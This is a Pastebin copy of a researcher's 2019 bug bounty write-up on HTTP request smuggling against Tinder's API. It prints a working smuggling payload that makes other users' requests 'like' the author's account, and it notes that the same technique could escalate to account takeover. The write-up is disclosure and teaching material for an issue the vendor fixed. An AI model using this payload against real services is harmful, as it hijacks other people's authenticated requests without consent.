---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-11-25_how-did-tons-of-people-like-me-on-tinder.md
original_filename: 2019-11-25_how-did-tons-of-people-like-me-on-tinder.md
title: How Did Tons of People Like Me on Tinder?
category: documents
detected_topics:
- access-control
- command-injection
- otp
- automation-abuse
- api-security
- mobile-security
tags:
- imported
- documents
- access-control
- command-injection
- otp
- automation-abuse
- api-security
- mobile-security
language: en
raw_sha256: 2a2d9ed3fb1bc1d89265ea492d27d4642e39c4597fb658cfb2737e798ecfdc49
text_sha256: e04ee6caa655f1eb350adbee51a1b3c9a7071ff68eb748f74cc907f1fe2a6964
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# How Did Tons of People Like Me on Tinder?

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-11-25_how-did-tons-of-people-like-me-on-tinder.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, automation-abuse, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `2a2d9ed3fb1bc1d89265ea492d27d4642e39c4597fb658cfb2737e798ecfdc49`
- Text SHA256: `e04ee6caa655f1eb350adbee51a1b3c9a7071ff68eb748f74cc907f1fe2a6964`


## Content

---
title: "How Did Tons of People Like Me on Tinder?"
page_title: "Başlangıç » Uncategorized » How Did Tons of People Like Me on Tinder?How Did T - Pastebin.com"
url: "https://pastebin.com/E6LMFm2w"
final_url: "https://pastebin.com/E6LMFm2w"
authors: ["Mustafa iran (@Mustafaran)"]
bugs: ["HTTP request smuggling"]
bounty: "2,500"
publication_date: "2019-11-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4917
---

[ Pastebin ](/)

[API](/doc_api) [tools](/tools) [faq](/faq)

[ paste ](/)

[Login](/login) [Sign up](/signup)

  * 

SHARE

TWEET

![Guest User](/themes/pastebin/img/guest.png)

# Untitled

a guest 

Nov 25th, 2019

7,550 

0 

Never 

1

**Not a member of Pastebin yet?** [**_Sign Up_**](/signup), it unlocks many cool features! 

[text](/archive/text) 5.99 KB  | None  | [0](/login?return_url=%2FE6LMFm2w "Like") [0](/login?return_url=%2FE6LMFm2w "Dislike")

[raw](/raw/E6LMFm2w) [download](/dl/E6LMFm2w) [clone](/clone/E6LMFm2w) [embed](/embed/E6LMFm2w) [print](/print/E6LMFm2w) [report](/report/E6LMFm2w)

  1. Başlangıç » Uncategorized » How Did Tons of People Like Me on Tinder? 

  2. How Did Tons of People Like Me on Tinder? 

  3. Kasım 23, 2019 tarihinde mustafa iran tarafından gönderildi 

  4.  5. These days, dating apps like tinder are so popular. So they have attracted my attention too, back in 2016. In this blog post, I will tell you why tons of people liked me just in a minute. At this point I should say that, I am not handsome, the reason is pretty different. 🙂 However, for those who are after plenty of likes, this post might be a some kind of clickbait for you. Because it is not possible anymore (thanks to me 🙂 ) at least using the technique here (share with me if you have any 🙂 ). You have been warned. Keep reading if you are curious about the technical reason. 

  6.  7. Ok lets get to business. I have been using the app since 2016. When Anand Prakash posted about the bug he had found in tinder (which turns out it is actually on accountkit by Facebook), I made a facepalm, because I also guessed the same vulnerability but I was so lazy and hopeless to check it out. Since then, I wanted to have a nice tinder vulnerability, and put it on my to-do list during my carrier 🙂 

  8.  9. In august 2019, James Kettle has published a new paper about HTTP request smuggling vulnerabilities. (I suggest you to read the paper otherwise you may not get the further of this post.) I had read the paper and honestly impressed because of technical details and consequences of the vulnerability. I also thought that it might make it possible to exploit my other attack scenarious. I wanted to look for places I would like to hack. Suprisingly (maybe not, due to being a new thing), tinder’s multiple applications was vulnerable to smuggling attacks. So, I was like “OK there is the vulnerability, what should be done to provide a POC?” 

  10.  11. I had reported the vulnerability without a POC to get rid of a potential duplicate which is the nightmare of BB hunter or to be able to know if it is has been already known. Luckily, it wasn’t. (14th of august 2019) 

  12.  13. Tinder app uses a backend api.gotinder.com which accepts requests as “json formatted”. This creates tasteless situation when exploiting smuggling vulnerability. I haven’t come across a handy cache mechanism at a glance. So I searched a bit and focused on “like” request which send using GET method. Below request is an example of a like request. __BENIM_ID__ is my tinder user id. Dynamic parts are id of the one who you liked and some authorization and authentication tokens. 

  14.  15. GET /like/__BENİM_ID__?locale=tr&s_number=852101394 HTTP/1.1 

  16. Host: api.gotinder.com 

  17. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 

  18. Accept: application/json 

  19. Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 

  20. Accept-Encoding: gzip, deflate 

  21. Referer: https://tinder.com/ 

  22. app-session-id: _belongs_the_one_who_send like__ 

  23. app-session-time-elapsed: 456121 

  24. app-version: 1021300 

  25. persistent-device-id: _belongs_the_one_who_send_like__ 

  26. tinder-version: 2.13.0 

  27. user-session-id: _belongs_the_one_who_send like__ 

  28. user-session-time-elapsed: 456048 

  29. x-supported-image-formats: jpeg 

  30. platform: web 

  31. X-Auth-Token: _belongs_the_one_who_send like__ 

  32. Origin: https://tinder.com 

  33. Connection: close 

  34.  35. I needed to build a malicious request and join it together with a request which “likes” my account. I came up with the below. 

  36.  37. POST /profile/photos HTTP/1.1 

  38. Host: api.gotinder.com 

  39. User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 

  40. Accept: application/json 

  41. Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 

  42. Accept-Encoding: gzip, deflate 

  43. Referer: https://tinder.com/ 

  44. app-session-id: _snipped_ 

  45. app-session-time-elapsed: 1959835 

  46. app-version: 1020406 

  47. persistent-device-id: _snipped_ 

  48. user-session-id: _snipped_ 

  49. user-session-time-elapsed: 236 

  50. x-supported-image-formats: jpeg 

  51. platform: web 

  52. X-Auth-Token: _snipped_ 

  53. Origin: https://tinder.com 

  54. Connection: keep-alive 

  55. Content-Type: application/x-www-form-urlencoded 

  56. Content-Length: 104 

  57. Transfer-Encoding : chunked 

  58.  59. 9 

  60. locale=tr 

  61. 0 

  62.  63. GET /like/__BENİM_ID__?locale=en&s_number=799974200 HTTP/1.1 

  64. X-Ignore: X 

  65.  66. There is no special purpose of /profile/photos. It is enough not to be rejected or not to be directed to a different endpoint. Below part is a “like” request which sent for my own account. As you can see, there is not much left from the original “like” request. the reason is to let the victim to complete the rest with his/her request. Because the idea of smuggling is joining our request (prefix) with victim’s request together. So victims completes it with their own authorization authentication headers. 

  67.  68. I changed the script of Burp smuggling extention to make only attack request and not the victim requests. The extention config was something like the below 

  69.  70. Screen Shot 2019-11-24 at 00.21.48 

  71.  72. I fired up the attack button and Boom! 🙂 I got hundreds of likes in minutes 🙂 

  73.  74.  75.  76. Actually, they hadn’t swipe me right but I had made them like my account. I got a working POC. An ultimate “boost” feature for free. By using this, I could enumerate all users on tinder or sell an ultimate boosting service. Likes are nice but there is a saying in Turkish; there is no pleasant things happen with enforcement.It was the time to add the POC to the report (24 august 2019) 

  77.  78. It would be my second laziness not to escalate it to a full account takeover vulnerability. However, Tinder team threw me a curve by mitigating the issue in hours. 

  79.  80. I reported smuggling issue for other domains of tinder and they marked all of them as a duplicate of the report which I wrote in this post. Eventhough it ‘s been mitigated in hours, it took months to mark it as resolved. In 22nd of October, it ‘s been marked as resolved and rewarded with $2,5K. 

  81.  82. Thanks for reading.

Advertisement

Comments 

  * ![fdfdsfsdfsd34234](/themes/pastebin/img/guest.png)

[fdfdsfsdfsd34234](/u/fdfdsfsdfsd34234)

354 days

Comment was deleted 

Add Comment 

Please, [**_Sign In_**](/login?return_url=%2FE6LMFm2w%23add_comment) to add comment 

[Public Pastes](/archive)

  * [Untitled](/f2RxTMxG?source=public_pastes)

15 hours ago | 0.16 KB 

  * [settings](/qEwC9z97?source=public_pastes)

15 hours ago | 0.10 KB 

  * [IT & AI](/sxcU4gjd?source=public_pastes)

1 day ago | 1.62 KB 

  * [Stationeers - Sign Tags from Power Distributi...](/56pAvxhf?source=public_pastes)

HTML | 1 day ago | 2.00 KB 

  * [PM: Shopify Client Edits](/R8WUbFEK?source=public_pastes)

1 day ago | 0.19 KB 

  * [PM: Shopify Assigning Design Task 2](/arZu9he1?source=public_pastes)

1 day ago | 0.14 KB 

  * [PM: Shopify Assigning Design Task 1](/Rj7ZLfTi?source=public_pastes)

1 day ago | 0.32 KB 

  * [Commodore Callback 8020](/Eg11GTSX?source=public_pastes)

1 day ago | 0.18 KB 

[](/tools#chrome "Google Chrome Extension") [](/tools#firefox "Firefox Extension") [](/tools#iphone "iPhone/iPad Application") [](/tools#windows "Windows Desktop Application") [](/tools#android "Android Application") [](/tools#macos "MacOS X Widget") [](/tools#opera "Opera Extension") [](/tools#pastebincl "Linux Application")

[create new paste](/) /  [syntax languages](/languages) /  [archive](/archive) /  [faq](/faq) /  [tools](/tools) /  [night mode](/night_mode) /  [api](/doc_api) /  [scraping api](/doc_scraping_api) /  [news](/news) /  [pro](/pro)  
[privacy statement](/doc_privacy_statement) /  [cookies policy](/doc_cookies_policy) /  [terms of service](/doc_terms_of_service) /  [security disclosure](/doc_security_disclosure) /  [dmca](/dmca) /  [report abuse](/report-abuse) /  [contact](/contact)  
  
By using Pastebin.com you agree to our [cookies policy](/doc_cookies_policy) to enhance your experience.  
Site design & logo © 2026 Pastebin

[](https://facebook.com/pastebin "Like us on Facebook") [](https://twitter.com/pastebin "Follow us on Twitter")

We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the [Cookies Policy](/doc_cookies_policy). OK, I Understand

[ ![](/themes/pastebin/img/hello.webp) ](/signup)

Not a member of Pastebin yet?  
[**Sign Up**](/signup), it unlocks many cool features!
